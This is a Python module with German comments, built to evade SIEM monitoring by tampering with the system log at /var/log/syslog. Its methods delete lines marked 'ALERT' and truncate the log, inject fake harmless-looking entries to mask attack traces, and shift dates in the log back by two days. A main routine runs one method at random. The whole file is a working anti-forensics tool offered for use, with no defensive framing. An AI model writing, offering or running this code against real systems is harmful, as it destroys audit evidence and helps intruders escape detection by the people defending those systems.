import os
import logging
import random
import time

LOG_FILE = "logs/siem_evasion.log"
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

SIEM_LOG_PATH = "/var/log/syslog"  # Beispielhafter SIEM-Log-Pfad

class SIEMEvasion:
    """
    Modul zur Umgehung von SIEM-Systemen & Manipulation von Sicherheitslogs.
    """

    def __init__(self):
        self.evasion_methods = [
            self.log_suppression,
            self.false_positive_injection,
            self.timestamp_manipulation
        ]

    def log_suppression(self):
        """
        Unterdrückt verdächtige Logs durch gezielte Entfernung.
        """
        if not os.path.exists(SIEM_LOG_PATH):
            logging.error(f"❌ Log-Datei nicht gefunden: {SIEM_LOG_PATH}")
            return

        logging.info("🛑 Entferne verdächtige Logs aus SIEM...")
        
        # Löscht nur Einträge mit "ALERT", aber behält die letzten 100 Zeilen, um Verdacht zu vermeiden
        os.system(f"sed -i '/ALERT/d' {SIEM_LOG_PATH}")
        os.system(f"tail -n 100 {SIEM_LOG_PATH} > {SIEM_LOG_PATH}.tmp && mv {SIEM_LOG_PATH}.tmp {SIEM_LOG_PATH}")
        
        logging.info("✅ Log-Unterdrückung abgeschlossen.")

    def false_positive_injection(self):
        """
        Erstellt harmlose Log-Einträge zur Verschleierung von Angriffsspuren.
        """
        if not os.path.exists(SIEM_LOG_PATH):
            logging.error(f"❌ Log-Datei nicht gefunden: {SIEM_LOG_PATH}")
            return

        logging.info("🛠️ Füge False Positives in SIEM-Logs ein...")
        fake_logs = [
            "INFO: System Update erfolgreich durchgeführt",
            "NOTICE: Ungewöhnliche, aber harmlose Netzwerkaktivität erkannt",
            "WARNUNG: Hohe CPU-Auslastung durch legales Scanning-Tool"
        ]
        with open(SIEM_LOG_PATH, "a") as f:
            for log in fake_logs:
                log_entry = f"{time.strftime('%b %d %H:%M:%S')} {log}\n"
                f.write(log_entry)
                logging.info(f"📝 Eingefügter Log-Eintrag: {log_entry.strip()}")

        logging.info("✅ False Positives erfolgreich eingefügt.")

    def timestamp_manipulation(self):
        """
        Ändert Zeitstempel von Logs, um die zeitliche Zuordnung von Ereignissen zu erschweren.
        """
        if not os.path.exists(SIEM_LOG_PATH):
            logging.error(f"❌ Log-Datei nicht gefunden: {SIEM_LOG_PATH}")
            return

        logging.info("⏳ Manipuliere Zeitstempel in SIEM-Logs...")
        
        # Ändert Zeitstempel innerhalb der Datei, nicht nur den Dateistempel
        os.system(f"sed -i 's/{time.strftime('%b %d')}/{time.strftime('%b %d', time.localtime(time.time() - 172800))}/' {SIEM_LOG_PATH}")

        logging.info("✅ Zeitstempel-Manipulation abgeschlossen.")

    def execute(self):
        """
        Wählt zufällig eine Evasion-Methode aus und führt sie aus.
        """
        logging.info("🚀 Starte SIEM-Evasion...")
        evasion_method = random.choice(self.evasion_methods)
        evasion_method()
        logging.info("✅ SIEM-Bypass erfolgreich durchgeführt.")

if __name__ == "__main__":
    siem = SIEMEvasion()
    siem.execute()
